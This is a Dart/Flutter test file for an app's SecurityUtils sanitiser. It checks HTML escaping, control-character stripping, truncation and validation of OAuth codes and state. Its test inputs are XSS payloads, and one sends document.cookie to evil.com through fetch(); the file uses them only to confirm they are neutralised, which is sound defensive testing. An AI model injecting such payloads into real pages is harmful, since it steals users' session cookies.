import 'package:flutter_test/flutter_test.dart';
import 'package:integrity_studio_ai/utils/security_utils.dart';

void main() {
  group('SecurityUtils', () {
    group('sanitizeUserInput', () {
      test('returns empty string for null input', () {
        expect(SecurityUtils.sanitizeUserInput(null), equals(''));
      });

      test('returns empty string for empty input', () {
        expect(SecurityUtils.sanitizeUserInput(''), equals(''));
      });

      test('escapes HTML script tags', () {
        const input = '<script>alert("xss")</script>';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, contains('&lt;script&gt;'));
        expect(result, contains('&lt;&#x2F;script&gt;'));
        expect(result, isNot(contains('<script>')));
      });

      test('escapes img tag with onerror XSS', () {
        const input = '<img src=x onerror="alert(1)">';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, contains('&lt;img'));
        expect(result, contains('&gt;'));
        expect(result, isNot(contains('<img')));
      });

      test('escapes all HTML special characters', () {
        const input = '< > " \' / &';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, contains('&lt;'));
        expect(result, contains('&gt;'));
        expect(result, contains('&quot;'));
        expect(result, contains('&#x27;'));
        expect(result, contains('&#x2F;'));
        expect(result, contains('&amp;'));
      });

      test('preserves safe text content', () {
        const input = 'Hello World! This is safe text.';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, equals('Hello World! This is safe text.'));
      });

      test('truncates to default maxErrorLength', () {
        final input = 'A' * 300;
        final result = SecurityUtils.sanitizeUserInput(input);

        // Should truncate around 200 chars + '...'
        expect(result.length, lessThanOrEqualTo(210));
        expect(result, endsWith('...'));
      });

      test('truncates to custom maxLength', () {
        final input = 'A' * 100;
        final result = SecurityUtils.sanitizeUserInput(input, maxLength: 50);

        expect(result.length, lessThanOrEqualTo(60));
        expect(result, endsWith('...'));
      });

      test('does not truncate if under limit', () {
        const input = 'Short message';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, equals('Short message'));
        expect(result, isNot(endsWith('...')));
      });

      test('handles complex XSS payload', () {
        const input =
            '''<script>fetch("https://evil.com?c="+document.cookie)</script>''';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, isNot(contains('<script>')));
        expect(result, isNot(contains('</script>')));
        expect(result, contains('&lt;script&gt;'));
      });

      test('handles nested HTML tags', () {
        const input = '<div><p onclick="evil()">Click me</p></div>';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, isNot(contains('<div>')));
        expect(result, isNot(contains('<p')));
        expect(result, contains('&lt;div&gt;'));
      });

      test('prevents double-encoding bypass', () {
        // Pre-encoded entities should be escaped again
        const input = '&lt;script&gt;';
        final result = SecurityUtils.sanitizeUserInput(input);

        // The & should be escaped, resulting in &amp;lt; not &lt;
        expect(result, contains('&amp;'));
        expect(result, isNot(equals('&lt;script&gt;')));
      });

      test('handles NULL byte injection', () {
        const input = '<script\x00>alert(1)</script>';
        final result = SecurityUtils.sanitizeUserInput(input);

        // NULL bytes should be stripped
        expect(result, isNot(contains('\x00')));
        // Script tags should still be escaped
        expect(result, contains('&lt;script'));
      });

      test('strips control characters except newline/tab', () {
        const input = 'Hello\x01\x02\x03World\nNew\tTab';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, isNot(contains('\x01')));
        expect(result, isNot(contains('\x02')));
        expect(result, contains('\n'));
        expect(result, contains('\t'));
      });

      test('handles Unicode homograph attack - fullwidth angle brackets', () {
        // \uFF1C is Fullwidth Less-Than Sign, looks like <
        const input = '\uFF1Cscript\uFF1E';
        final result = SecurityUtils.sanitizeUserInput(input);

        // Should be escaped like regular angle brackets
        expect(result, contains('&lt;'));
      });

      test('handles Unicode homograph attack - angle bracket variants', () {
        // \u3008 is Left Angle Bracket
        const input = '\u3008script\u3009';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, contains('&lt;'));
      });

      test('handles mixed case tags', () {
        const input = '<ScRiPt>alert(1)</sCrIpT>';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, isNot(contains('<ScRiPt>')));
        expect(result, contains('&lt;ScRiPt&gt;'));
      });

      test('handles emoji and 4-byte UTF-8', () {
        const input = '💀<script>';
        final result = SecurityUtils.sanitizeUserInput(input);

        expect(result, contains('💀'));
        expect(result, contains('&lt;script&gt;'));
      });

      test('does not split HTML entities on truncation', () {
        // Create input that would split an entity
        final input = '${'A' * 197}&lt;';
        final result = SecurityUtils.sanitizeUserInput(input);

        // Should not end with partial entity like '&am' or '&'
        expect(result, isNot(endsWith('&...')));
        expect(result, isNot(endsWith('&a...')));
        expect(result, isNot(endsWith('&am...')));
        expect(result, isNot(endsWith('&amp...')));
      });
    });

    group('isSafeForDisplay', () {
      test('returns true for null input', () {
        expect(SecurityUtils.isSafeForDisplay(null), isTrue);
      });

      test('returns true for empty input', () {
        expect(SecurityUtils.isSafeForDisplay(''), isTrue);
      });

      test('returns true for safe alphanumeric text', () {
        expect(SecurityUtils.isSafeForDisplay('Hello World 123'), isTrue);
      });

      test('returns false for text with angle brackets', () {
        expect(SecurityUtils.isSafeForDisplay('<script>'), isFalse);
        expect(SecurityUtils.isSafeForDisplay('text>more'), isFalse);
      });

      test('returns false for text with quotes', () {
        expect(SecurityUtils.isSafeForDisplay('say "hello"'), isFalse);
        expect(SecurityUtils.isSafeForDisplay("it's"), isFalse);
      });

      test('returns false for text with forward slash', () {
        expect(SecurityUtils.isSafeForDisplay('path/to/file'), isFalse);
      });

      test('returns false for text with ampersand', () {
        expect(SecurityUtils.isSafeForDisplay('foo & bar'), isFalse);
      });

      test('returns false for Unicode angle bracket lookalikes', () {
        expect(SecurityUtils.isSafeForDisplay('\uFF1Ctest'), isFalse);
        expect(SecurityUtils.isSafeForDisplay('\u3008test'), isFalse);
      });

      test('returns false for NULL bytes', () {
        expect(SecurityUtils.isSafeForDisplay('test\x00test'), isFalse);
      });

      test('returns false for control characters', () {
        expect(SecurityUtils.isSafeForDisplay('test\x01test'), isFalse);
      });

      test('returns true for allowed whitespace', () {
        expect(SecurityUtils.isSafeForDisplay('test\ntest'), isTrue);
        expect(SecurityUtils.isSafeForDisplay('test\ttest'), isTrue);
      });
    });

    group('sanitizeErrorCode', () {
      test('returns null for null input', () {
        expect(SecurityUtils.sanitizeErrorCode(null), isNull);
      });

      test('returns null for empty input', () {
        expect(SecurityUtils.sanitizeErrorCode(''), isNull);
      });

      test('allows valid error codes with underscores', () {
        expect(SecurityUtils.sanitizeErrorCode('access_denied'),
            equals('access_denied'));
        expect(SecurityUtils.sanitizeErrorCode('INVALID_TOKEN'),
            equals('INVALID_TOKEN'));
      });

      test('allows valid error codes with hyphens', () {
        expect(SecurityUtils.sanitizeErrorCode('access-denied'),
            equals('access-denied'));
      });

      test('allows alphanumeric error codes', () {
        expect(SecurityUtils.sanitizeErrorCode('error123'), equals('error123'));
        expect(SecurityUtils.sanitizeErrorCode('E404'), equals('E404'));
      });

      test('sanitizes error codes with special characters', () {
        final result = SecurityUtils.sanitizeErrorCode('<script>');
        expect(result, contains('&lt;'));
        expect(result, isNot(contains('<')));
      });

      test('truncates long error codes', () {
        final longCode = 'error_' * 20;
        final result = SecurityUtils.sanitizeErrorCode(longCode);

        expect(result!.length, lessThanOrEqualTo(103)); // 100 + '...'
      });
    });

    group('sanitizeOAuthCode', () {
      test('returns null for null input', () {
        expect(SecurityUtils.sanitizeOAuthCode(null), isNull);
      });

      test('returns null for empty input', () {
        expect(SecurityUtils.sanitizeOAuthCode(''), isNull);
      });

      test('allows valid base64 OAuth codes', () {
        const code = 'abc123XYZ+/=';
        expect(SecurityUtils.sanitizeOAuthCode(code), equals(code));
      });

      test('allows valid base64url OAuth codes', () {
        const code = 'abc123XYZ_-';
        expect(SecurityUtils.sanitizeOAuthCode(code), equals(code));
      });

      test('sanitizes OAuth codes with special characters', () {
        final result = SecurityUtils.sanitizeOAuthCode('<script>');
        expect(result, contains('&lt;'));
        expect(result, isNot(contains('<')));
      });

      test('truncates extremely long OAuth codes', () {
        final longCode = 'a' * 3000;
        final result = SecurityUtils.sanitizeOAuthCode(longCode);

        expect(result!.length, lessThanOrEqualTo(2051)); // 2048 + '...'
      });
    });

    group('sanitizeOAuthState', () {
      test('returns null for null input', () {
        expect(SecurityUtils.sanitizeOAuthState(null), isNull);
      });

      test('returns null for empty input', () {
        expect(SecurityUtils.sanitizeOAuthState(''), isNull);
      });

      test('allows valid hex state values', () {
        const state = 'abc123def456';
        expect(SecurityUtils.sanitizeOAuthState(state), equals(state));
      });

      test('allows valid base64url state values', () {
        const state = 'abc123_-XYZ.';
        expect(SecurityUtils.sanitizeOAuthState(state), equals(state));
      });

      test('sanitizes state with special characters', () {
        final result = SecurityUtils.sanitizeOAuthState('<script>');
        expect(result, contains('&lt;'));
        expect(result, isNot(contains('<')));
      });

      test('truncates long state values', () {
        final longState = 'a' * 150;
        final result = SecurityUtils.sanitizeOAuthState(longState);

        expect(result!.length, lessThanOrEqualTo(103)); // 100 + '...'
      });
    });

    group('constants', () {
      test('maxErrorLength is reasonable', () {
        expect(SecurityUtils.maxErrorLength, equals(200));
      });

      test('maxErrorCodeLength is reasonable', () {
        expect(SecurityUtils.maxErrorCodeLength, equals(100));
      });

      test('maxOAuthCodeLength is reasonable', () {
        expect(SecurityUtils.maxOAuthCodeLength, equals(2048));
      });
    });
  });
}
